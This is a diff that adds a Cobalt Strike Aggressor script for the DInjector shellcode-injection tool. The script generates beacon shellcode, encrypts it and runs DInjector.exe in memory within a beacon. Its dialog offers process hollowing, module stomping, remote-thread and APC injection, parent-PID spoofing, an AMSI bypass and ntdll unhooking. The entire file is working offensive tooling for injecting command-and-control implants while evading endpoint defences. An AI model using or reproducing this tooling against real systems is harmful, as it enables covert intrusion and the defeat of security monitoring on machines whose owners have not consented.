@@ -1,0 +1,170 @@
+sub dinject {
+
+    local('%options $bid $handle $shellcode_filename $raw_shellcode $enc_shellcode $pass $cmd $python_cmd $tmp');
+
+    show_message("DInjector initiated! Wait for the beacon to call home");
+
+    %options = $3;
+    $bid = %options["bid"];
+
+    btask($bid, "\c7Tasked beacon to execute DInjector.exe assembly\o", "T1055");
+
+    # Choose shellcode
+    if (strlen(%options["custom_shellcode"]) > 0) {
+        # Custom shellcode
+        $shellcode_filename = %options["custom_shellcode"];
+    }
+    else {
+        # Generate beacon
+        $shellcode_filename = "/tmp/beacon.bin";
+
+        if (%options["staged"] eq "true") {
+            $raw_shellcode = payload(%options["listener"], "x64", %options["exitfunc"]);
+        }
+        else {
+            $raw_shellcode = artifact_payload(%options["listener"], "raw", "x64");
+        }
+
+        $handle = openf(">$shellcode_filename");
+        writeb($handle, $raw_shellcode);
+        wait($handle);
+        closef($handle);
+    }
+
+    # Start building the DInjector command assigning the injection technique first
+    $cmd = %options["technique"];
+
+    # Encrypt the shellcode based on the selected injection technique
+    $pass  = gen_random_string(8, 12);
+
+    @python_cmd = @("python3", script_resource("encrypt.py"), "$shellcode_filename", "-p", "$pass", "-o", "/tmp/enc");
+    if ($cmd eq "CurrentThreadUuid") {
+        push(@python_cmd, "--uuid");
+    }
+
+    $handle = exec(@python_cmd);
+    wait($handle);
+    closef($handle);
+
+    # Read encrypted shellcode and base64 encode it
+    $handle = openf("/tmp/enc");
+    $enc_shellcode = readb($handle, -1);
+    wait($handle);
+    closef($handle);
+    $cmd .= " /sc:" . base64_encode($enc_shellcode);
+
+    # Construct the rest of the DInjector command
+    $cmd .= " /password:$pass";
+    $cmd .= " /image:" . %options["image"];
+    $cmd .= " /pid:" . %options["pid"];
+    $cmd .= " /ppid:" . %options["ppid"];
+    $cmd .= " /dll:" . %options["dll"];
+    $cmd .= " /stomp:" . %options["stomp"];
+    $cmd .= " /export:" . %options["export"];
+    $cmd .= " /sleep:" . %options["sleep"];
+
+    if (%options["blockDlls"] eq "true") {
+        $cmd .= " /blockDlls:True";
+    }
+
+    if (%options["am51"] eq "true") {
+        $cmd .= " /am51:True";
+    }
+
+    if (%options["unhook"] eq "true") {
+        $cmd .= " /unhook:True";
+    }
+
+    # Execute DInjector
+    bexecute_assembly($bid, script_resource("DInjector.exe"), "$cmd");
+
+    blog($bid, "\c7Executed command\cF:\cD execute-assembly DInjector.exe "
+         . %options["technique"] . " /sc:<BASE64>" . " /password:$pass" . " /image:" . %options["image"]
+         . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
+         . " /stomp:" . %options["stomp"] . " /export:" . %options["export"] . " /sleep:" . %options["sleep"]
+         . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . " /unhook:" . %options["unhook"]);
+}
+
+sub gen_random_string {
+
+    local('@alphabet $len $i $str');
+
+    @alphabet = @("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k",
+                  "l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F",
+                  "G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
+    
+    # Random string of length between $1 and $2
+    $len = rand($1) + $2;
+    for($i = 0; $i < $len; $i++) {
+        $str .= rand(@alphabet);
+    }
+
+    return $str;
+}
+
+popup beacon_bottom {
+    item "DInjector" {
+
+        local('$dialog %options');
+
+        %options["bid"] = $1[0];
+
+        # Setup options values
+        %options["technique"] = "CurrentThread";
+        %options["staged"]    = "false";
+        %options["exitfunc"]  = "process";
+        %options["image"]     = "C:\\Windows\\System32\\svchost.exe";
+        %options["pid"]       = "0";
+        %options["ppid"]      = "0";
+        %options["dll"]       = "msvcp_win.dll";
+        %options["stomp"]     = "xpsservices.dll";
+        %options["export"]    = "DllCanUnloadNow";
+        %options["blockDlls"] = "true";
+        %options["am51"]      = "true";
+        %options["sleep"]     = "0";
+        %options["unhook"]    = "false";
+
+        # Create a dialog
+        $dialog = dialog("Dynamic Shellcode Injection", %options, &dinject);
+
+        dialog_description($dialog, "Perform dynamic shellcode injection using a technique preferrable in current environment. WARNING: the beacon console may be flushed after execution!");
+
+        drow_file($dialog, "custom_shellcode", "Custom shellcode:");
+
+        drow_listener_stage($dialog, "listener", "Listener:");
+        drow_checkbox($dialog, "staged", "Stage type (beacon payload):", "Use staged payload");
+        drow_combobox($dialog, "exitfunc", "Exit function (staged beacon payload):", @("process",
+                                                                                       "thread"));
+
+        drow_combobox($dialog, "technique", "Injection technique:", @("FunctionPointer",
+                                                                      "FunctionPointerV2",
+                                                                      "ClipboardPointer",
+                                                                      "CurrentThread",
+                                                                      "CurrentThreadUuid",
+                                                                      "RemoteThread",
+                                                                      "RemoteThreadDll",
+                                                                      "RemoteThreadView",
+                                                                      "RemoteThreadKernelCB",
+                                                                      "RemoteThreadAPC",
+                                                                      "RemoteThreadContext",
+                                                                      "ProcessHollowing",
+                                                                      "ModuleStomping"));
+
+        drow_text($dialog, "image",  "Path to the image of a newly spawned process to inject into:");
+        drow_text($dialog, "pid",    "Existing process ID to inject into:");
+        drow_text($dialog, "ppid",   "Parent process ID to spoof the original value with:");
+        drow_text($dialog, "dll",    "Loaded DLL name to overwrite its .text section for storing the shellcode:");
+        drow_text($dialog, "stomp",  "Name of the DLL to stomp:");
+        drow_text($dialog, "export", "Exported function name to overwrite:");
+        drow_text($dialog, "sleep",  "Sleep:", "number of seconds (approx.) to sleep before execution (10s-60s)");
+
+        drow_checkbox($dialog, "blockDlls", "DLLs:",   "Block 3rd-party DLLs");
+        drow_checkbox($dialog, "am51",      "AMSI:",   "Bypass AMSI");
+        drow_checkbox($dialog, "unhook",    "Unhook:", "Unhook ntdll.dll");
+
+        dbutton_action($dialog, "Inject");
+
+        # Show the dialog
+        dialog_show($dialog);
+    }
+}
